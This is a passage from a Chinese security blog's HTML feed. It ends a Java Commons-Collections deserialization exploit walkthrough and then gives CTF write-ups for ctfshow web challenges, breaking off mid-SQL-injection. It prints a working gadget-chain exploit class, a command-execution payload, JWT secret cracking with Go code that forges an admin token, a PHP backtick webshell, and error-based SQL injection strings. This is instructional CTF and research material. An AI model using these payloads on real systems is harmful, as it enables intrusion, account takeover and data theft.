class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token comment">// 命令执行</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment">// 防止在 put 时执行</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>                <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 lazyMap</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 tiedMapEntry</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 利用 HashMap 触发 hashCode</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> expHashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 利用反射修改为正确值</span>        <span class="token class-name">Field</span> iTransformers <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 清除 put 对 lazyMap 的影响</span>        lazyMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 执行序列化与反序列化</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expHashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/../../../../../pic/image-20230125224917322.png"></p><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><p><a href="https://github.com/frohoff/ysoserial">ysoserial</a></p><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.788">Java反序列化CommonsCollections篇(二)-最好用的CC链</a></p><p><a href="https://xz.aliyun.com/t/9409#toc-1">CC链 1-7 分析</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 秀 - 税务比武</title>
      <link href="/2023/01/22/catchtheflag/ctf-xiu/ctf-xiu-shui-wu-bi-wu/"/>
      <url>/2023/01/22/catchtheflag/ctf-xiu/ctf-xiu-shui-wu-bi-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-秀-税务比武"><a href="#CTF-秀-税务比武" class="headerlink" title="CTF 秀 - 税务比武"></a>CTF 秀 - 税务比武</h1><p>题目描述：应广大铁军同志要求，开放某省税务比赛题目(CTF部分)</p><h2 id="1-web832"><a href="#1-web832" class="headerlink" title="1. web832"></a>1. web832</h2><ul><li>题目描述</li></ul><p>html、css、js 的内容无论是否在页面显示都会被浏览器下载，被用户看到，所以，千万不要把测试用的信息放在这些地方。            </p><ul><li>题目解析</li></ul><p>根据提示查看页面源代码，在最下面发现内容</p><p><img src="/../../../pic/image-20230122163744600.png"></p><p>提交<strong>网络安全为人民</strong>即可</p><p><img src="/../../../pic/image-20230122163949547.png"></p><h2 id="2-web833"><a href="#2-web833" class="headerlink" title="2. web833"></a>2. web833</h2><ul><li>题目描述</li></ul><p>很多网站都会有一个 <strong>robots.txt</strong> 文件，其最初的目的是防止爬虫肆虐的一个安全措施，可是一不小心也会将重要信息泄露出去。            </p><ul><li>题目解析</li></ul><p>访问 robots.txt 获得内容</p><pre class="line-numbers language-none"><code class="language-none">User-agent: *Disallow: /check.php.bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问 /check.php.bak 获得备份文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$index</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"strip_tags"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"addslashes"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$index</span> <span class="token operator">?</span> <span class="token variable">$filter</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$filter</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">getHandle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$say</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$hello</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$hello</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$say</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">getHandle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hello "</span> <span class="token operator">.</span> <span class="token variable">$msg</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过代码审计可知 getHandle 返回一个匿名函数，该函数可以通过对传入的数组进行释放，导入到当前符号表中，同时执行了参数$filter作为函数名，$name作为函数参数的代码。</p><p>但是可以使用 <code>extract()</code> 进行变量覆盖从而实现任意代码执行</p><p>构造 payload </p><pre class="line-numbers language-none"><code class="language-none">[GET]/check.php?filter=system&amp;name=cat /f*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-web834"><a href="#3-web834" class="headerlink" title="3. web834"></a>3. web834</h2><ul><li>题目描述</li></ul><p>有的时我们总在似安全的技巧上自作聪明，哪怕他会带来的是更大的风险。而真正有效的安全手段却往往被忽视，比如从2004年ctais上线便风靡税务系统的“儿童节密码”（6个1）。——想想吧，当多此一举的的逻辑与草率的秘钥结合起来，那会有多么危险<br>还有，你想要的秘密，只有admin用户知道。                                                 </p><ul><li>题目解析</li></ul><p>根据提示可知需要登录 admin 用户，测试弱口令无果</p><p>先注册个用户测试一下</p><p>在修改用户密码的时候，注意到 Cookie的值</p><p><img src="/../../../pic/image-20230122170530634.png"></p><p>对 Cookie 解密后发现其中存储着用户名，或许可以通过修改该用户名实现修改 admin 用户的密码</p><p><img src="/../../../pic/image-20230122170554824.png"></p><p>但是要修改的话需要获取到加密的秘钥，进行简单爆破一下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">hashcat.exe -a 0 -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJjdGZzaG93IiwibmFtZSI6InRlc3QifQ.-kj-qrzFxD2p717HfS_7GIPF7Wux4-qFiZpsJZyXRhQ ..\jwt.secrets.list --show<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取到秘钥为 <code>111111</code></p><p><img src="/../../../pic/image-20230122171056882.png"></p><p>使用 Golang 生成新的 token</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/golang-jwt/jwt/v4"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>claims <span class="token operator">:=</span> jwt<span class="token punctuation">.</span>MapClaims<span class="token punctuation">{</span><span class="token string">"iss"</span><span class="token punctuation">:</span>  <span class="token string">"ctfshow"</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token punctuation">}</span>token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodHS256<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>signedString<span class="token punctuation">,</span> err <span class="token operator">:=</span> token<span class="token punctuation">.</span><span class="token function">SignedString</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"111111"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"token = %v"</span><span class="token punctuation">,</span> signedString<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿着新生成的 token 发包</p><p><img src="/../../../pic/image-20230122173403017.png"></p><p>然后使用 admin / test 登录</p><p><img src="/../../../pic/image-20230122173508170.png"></p><h2 id="4-web835"><a href="#4-web835" class="headerlink" title="4. web835"></a>4. web835</h2><ul><li>题目描述</li></ul><blockquote><p>听说这个网站的管理员的密码挺弱的。  </p><p>听说这个网站的管理员喜欢把核心源码备份一份，而且有强迫症的他必然会使用 hbsw？.zip\ 这个他喜欢的名字。    </p><p>? 为数字           </p></blockquote><ul><li>题目解析</li></ul><p>按照题目这题应该是弱口令了吧</p><p>使用 <code>admin / 123456</code> 登录，进入后为一个上传页面</p><p>经过爆破访问 <code>/hbsw1.zip</code> 获得网站源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string double-quoted-string">"upload"</span><span class="token punctuation">:</span>        <span class="token function">doUpload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string double-quoted-string">"include"</span><span class="token punctuation">:</span>        <span class="token function">doInclude</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token string double-quoted-string">"nothing here"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">doInclude</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/log|php|tmp/i"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error filenname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token string double-quoted-string">"file://"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">doUpload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件上传失败"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$tmp_name</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_filename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件上传失败"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_content</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件上传失败"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"./upload/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件上传成功,文件路径为  /var/www/html/upload/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">filter_filename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ban_ext</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ban_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">filter_content</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|include|require|get|post|request/i"</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在对内容的过滤</p><p>构造上传内容</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`$_COOKIE[0]`</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/image-20230122175654468.png"></p><p>利用文件包含执行命令</p><p><img src="/../../../pic/image-20230122175816095.png"></p><h2 id="5-web836"><a href="#5-web836" class="headerlink" title="5. web836"></a>5. web836</h2><ul><li>题目描述</li></ul><blockquote><p>SQL注入是另一个古老的问题，记得二十年前老师对我说，SQL注入太简单，所以很快就会绝种。时间告诉我，老师错了，因为很多漏洞不是因为他有多复杂，而是因为它足够简单——简单到任何一个程序员都有可能去错。</p><p>​                        尤其是在逻辑互通、系统互联的复杂业务流程中，不同的程序员往往会采取不同的方法解决安全问题，而这种解决思路的差异使这种风险更具隐蔽性，二次注入便是其典型代表。</p><p>​                        朋友，请牢记，系统安全性永远取决于最蠢的那个程序员。</p></blockquote><ul><li>题目解析</li></ul><p>提示 SQL 注入，注入点在修改密码处</p><p>注册一个账户 <code>test' or sleep(3);# / test</code>，然后修改密码的时候会发现成功延迟了三秒，尝试报错注入</p><pre class="line-numbers language-none"><code class="language-none">test' AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126))) -- qwe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/image-20230122182024349.png"></p><pre class="line-numbers language-none"><code class="language-none">test' AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=database()))) -- qwe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得表名 <code>app_flag</code></p><pre class="line-numbers language-none"><code class="language-none">test' AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),COLUMN_NAME,CHAR(126)) FROM information_schema.COLUMNS WHERE table_schema=database() AND table_name='app_flag'))) -- qwe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得列名 